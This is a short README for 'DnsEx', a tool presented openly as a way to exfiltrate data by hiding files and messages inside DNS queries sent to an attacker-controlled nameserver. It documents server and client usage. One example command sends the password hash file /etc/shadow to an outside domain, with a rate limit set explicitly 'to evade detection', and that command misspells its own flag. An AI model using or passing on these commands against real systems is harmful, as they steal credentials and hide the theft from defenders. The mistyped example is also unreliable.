# DnsEx

Data exfiltration tool that disguises arbitrary payloads and files as innocent DNS traffic.

---

### Server
The server acts as an authoritative DNS nameserver. It listens for incoming queries, reassembles the chunks, handles retransmissions, and saves the final files to disk.

**Usage:**
```bash
dnsex server [OPTIONS] --domain <DOMAIN>
```

**Options:**
```text
  -d, --domain <DOMAIN>   The base domain to listen for (e.g., exfil.com)
  -b, --bind <BIND>       IP to bind to [default: 0.0.0.0]
  -p, --port <PORT>       Port to listen on [default: 8053]
  -h, --help              Print help
```

---

### Client
The client takes your local data, chunks it, encodes it, and sends it out over DNS queries to your server.

**Usage:**
```bash
dnsex client [OPTIONS] --domain <DOMAIN> [MESSAGE]
```

**Options:**
```text
  [MESSAGE]                    A simple text string to exfiltrate
  -d, --domain <DOMAIN>        The target domain of your DnsEx server
  -p, --port <PORT>            The DNS port to target [default: 8053]
  -f, --file <FILE>            Path to a file to exfiltrate
      --rate-limit <LIMIT>     Delay between queries in ms [default: 100]
  -h, --help                   Print help
```

---

## Examples

**Start the Server:**
Listen on the standard DNS port (requires root/sudo).
```bash
sudo dnsex server -d yourdomain.com -p 53
```

**Send a quick message:**
```bash
dnsex client -d yourdomain.com "Hello from the inside"
```

**Exfiltrate a file:**
Send a sensitive file with a 50ms delay between packets to evade detection.
```bash
dnsex client -d yourdomain.com -f /etc/shadow --rate-limt 50
```
